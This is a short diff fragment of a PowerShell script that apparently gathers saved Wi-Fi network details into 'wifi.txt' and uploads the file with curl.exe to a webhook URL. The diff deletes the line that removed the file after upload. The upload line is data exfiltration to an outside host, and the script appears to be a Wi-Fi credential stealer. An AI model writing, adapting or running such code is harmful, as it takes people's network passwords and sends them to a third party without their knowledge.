@@ -39,5 +39,4 @@ foreach($network in $names)
 }
 $file = Join-Path -Path $PWD -ChildPath "wifi.txt"
 curl.exe -F "file1=@$file" $webhookURL
-Remove-Item $file
 EXIT
